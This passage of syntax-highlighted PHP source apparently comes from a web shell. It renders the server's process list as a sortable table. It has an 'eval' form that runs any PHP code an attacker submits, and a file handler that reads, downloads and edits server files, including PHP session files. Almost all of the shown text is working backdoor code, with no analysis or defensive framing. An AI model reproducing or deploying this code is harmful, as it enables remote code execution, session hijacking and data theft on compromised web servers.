     <span class="nv">$prcs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$line</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
   <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
   <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot;        &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);}</span>
   <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot;        &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);}</span>
   <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot;        &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);}</span>
   <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot;        &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);}</span>
   <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot;        &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);}</span>
   <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot;        &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);}</span>
   <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot;        &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);}</span>
   <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot;        &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);}</span>
   <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot;        &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);}</span>
   <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;                &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;                &quot;</span><span class="p">,</span><span class="s2">&quot;        &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);}</span>
   <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;         &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;         &quot;</span><span class="p">,</span><span class="s2">&quot;        &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);}</span>
   <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">convert_cyr_string</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
   <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
   <span class="nb">unset</span><span class="p">(</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
   <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$stack</span><span class="p">);</span>
   <span class="nv">$head</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;        &quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
   <span class="nv">$head</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$head</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
   <span class="nv">$head</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$head</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
   <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span><span class="nv">$stack</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
   <span class="nb">unset</span><span class="p">(</span><span class="nv">$head</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
   <span class="nv">$head</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$head</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.processes_sort.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;a</span><span class="se">\&quot;</span><span class="s2">&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;!&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="k">else</span> <span class="p">{</span><span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.processes_sort.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;d</span><span class="se">\&quot;</span><span class="s2">&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;!&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$k</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">))</span> <span class="p">{</span><span class="nv">$k</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;}</span>
   <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span><span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.processes_sort.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;a</span><span class="se">\&quot;</span><span class="s2">&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="p">}</span>
   <span class="nv">$prcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$stack</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$line</span><span class="p">))</span>
    <span class="p">{</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
     <span class="nv">$line</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;        &quot;</span><span class="p">,</span><span class="nv">$line</span><span class="p">);</span>
     <span class="nv">$line</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
     <span class="nv">$line</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$line</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span><span class="o">*</span><span class="mi">1024</span><span class="p">;</span>
     <span class="nv">$prcs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$line</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
   <span class="p">}</span>
  <span class="p">}</span>
  <span class="nv">$head</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$head</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$y</span><span class="p">;</span>
  <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$processes_sort</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
  <span class="nb">usort</span><span class="p">(</span><span class="nv">$prcs</span><span class="p">,</span><span class="s2">&quot;tabsort&quot;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$processes_sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$prcs</span> <span class="o">=</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$prcs</span><span class="p">);}</span>
  <span class="nv">$tab</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
  <span class="nv">$tab</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$head</span><span class="p">;</span>
  <span class="nv">$tab</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tab</span><span class="p">,</span><span class="nv">$prcs</span><span class="p">);</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=</span><span class="se">\&quot;</span><span class="s2">100%</span><span class="se">\&quot;</span><span class="s2"> bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=</span><span class="se">\&quot;</span><span class="s2">#C0C0C0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$tab</span> <span class="k">as</span> <span class="nv">$i</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$k</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
   <span class="k">foreach</span><span class="p">(</span><span class="nv">$k</span> <span class="k">as</span> <span class="nv">$j</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$win</span> <span class="k">and</span> <span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span> <span class="k">and</span> <span class="nv">$j</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$v</span><span class="p">);}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
 <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;eval&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$eval</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Result of execution this PHP-code&amp;lt;/b&amp;gt;:&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
  <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">ob_get_contents</span><span class="p">();</span>
  <span class="nv">$olddir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
  <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="nb">ob_clean</span><span class="p">();</span>
   <span class="k">eval</span><span class="p">(</span><span class="nv">$eval</span><span class="p">);</span>
   <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">ob_get_contents</span><span class="p">();</span>
   <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">convert_cyr_string</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
   <span class="nb">ob_clean</span><span class="p">();</span>
   <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$eval_txt</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span><span class="nv">$rows</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;textarea cols=</span><span class="se">\&quot;</span><span class="s2">122</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rows</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$ret</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$ret</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$eval_txt</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;textarea cols=</span><span class="se">\&quot;</span><span class="s2">122</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">15</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">eval</span><span class="p">(</span><span class="nv">$eval</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$ret</span><span class="p">;}</span>
  <span class="p">}</span>
  <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$olddir</span><span class="p">);</span>
 <span class="p">}</span>
 <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Execution PHP-code&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$eval_txt</span><span class="p">))</span> <span class="p">{</span><span class="nv">$eval_txt</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}}</span>
 <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=POST&amp;gt;&amp;lt;input type=hidden name=act value=eval&amp;gt;&amp;lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">eval</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">122</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">10</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$eval</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">d</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$dispd</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=submit value=</span><span class="se">\&quot;</span><span class="s2">Execute</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;Display in text-area&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">eval_txt</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$eval_txt</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; checked&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;f&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span> <span class="k">or</span> <span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="k">and</span> <span class="nv">$ft</span> <span class="o">!=</span> <span class="s2">&quot;edit&quot;</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Permision denied (&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)!&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;File does not exists (&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;edit&#39;;document.todo.c.value=&#39;1&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;Create&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="p">}</span>
 <span class="k">else</span>
 <span class="p">{</span>
  <span class="nv">$r</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
  <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$f</span><span class="p">);</span>
  <span class="nv">$c</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$ext</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$ext</span><span class="p">[</span><span class="nv">$c</span><span class="p">];</span>
  <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$ext</span><span class="p">);</span>
  <span class="nv">$rft</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$ftypes</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="nv">$rft</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span> <span class="k">break</span><span class="p">;}}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;sess_(.*)&quot;</span><span class="p">,</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span><span class="nv">$rft</span> <span class="o">=</span> <span class="s2">&quot;phpsess&quot;</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ft</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ft</span> <span class="o">=</span> <span class="nv">$rft</span><span class="p">;}</span>
  <span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;DIZ&quot;</span><span class="p">,</span><span class="s2">&quot;info&quot;</span><span class="p">),</span>
   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;HTML&quot;</span><span class="p">,</span><span class="s2">&quot;html&quot;</span><span class="p">),</span>
   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;TXT&quot;</span><span class="p">,</span><span class="s2">&quot;txt&quot;</span><span class="p">),</span>
   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Code&quot;</span><span class="p">,</span><span class="s2">&quot;code&quot;</span><span class="p">),</span>
   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Session&quot;</span><span class="p">,</span><span class="s2">&quot;phpsess&quot;</span><span class="p">),</span>
   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;EXE&quot;</span><span class="p">,</span><span class="s2">&quot;exe&quot;</span><span class="p">),</span>
   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;SDB&quot;</span><span class="p">,</span><span class="s2">&quot;sdb&quot;</span><span class="p">),</span>
   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;INI&quot;</span><span class="p">,</span><span class="s2">&quot;ini&quot;</span><span class="p">),</span>
   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;DOWNLOAD&quot;</span><span class="p">,</span><span class="s2">&quot;download&quot;</span><span class="p">),</span>
   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;RTF&quot;</span><span class="p">,</span><span class="s2">&quot;notepad&quot;</span><span class="p">),</span>
   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;EDIT&quot;</span><span class="p">,</span><span class="s2">&quot;edit&quot;</span><span class="p">)</span>
  <span class="p">);</span>
